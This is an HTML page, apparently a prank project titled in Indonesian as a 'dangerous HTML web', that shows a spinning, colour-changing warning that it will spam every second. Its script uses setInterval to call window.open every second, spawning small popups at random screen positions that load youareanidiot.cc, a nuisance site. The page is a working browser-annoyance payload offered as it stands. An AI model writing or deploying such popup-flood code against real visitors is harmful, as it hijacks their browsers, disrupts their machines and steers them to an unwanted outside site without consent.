# erorgabuts
<!DOCTYPE html>
<html lang="en">
<head>
    <title>web HTML bahaya</title>
    <link rel="icon" href="images.ico">
    <style>
        body {
            background-color: black;
            color: white;
            text-align: center;
            font-size: 2em;
            font-family: Arial, sans-serif;
        }
        .message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: move 2s infinite, colorChange 5s infinite;
        }
        @keyframes move {
            0% { transform: translate(-50%, -50%) rotate(0deg); }
            50% { transform: translate(-50%, -50%) rotate(360deg); }
            100% { transform: translate(-50%, -50%) rotate(0deg); }
        }
        @keyframes colorChange {
            0% { color: rgb(255, 230, 0); }
            25% { color: red; }
            50% { color: green; }
            75% { color: blue; }
            100% { color: rgb(255, 0, 242); }
        }
    </style>
</head>
<body>
    <div class="message">hati hati web akan terus spam setiap 1 detik</div>
    <script>
        function openWindow(url) {
            const width = 200;
            const height = 100;
            const left = Math.floor(Math.random() * (screen.width - width));
            const top = Math.floor(Math.random() * (screen.height - height));
            window.open(url, '', `width=${width},height=${height},top=${top},left=${left}`);
        }
        setInterval(() => openWindow('https://youareanidiot.cc/'), 1000);
    </script>
</body>
</html>
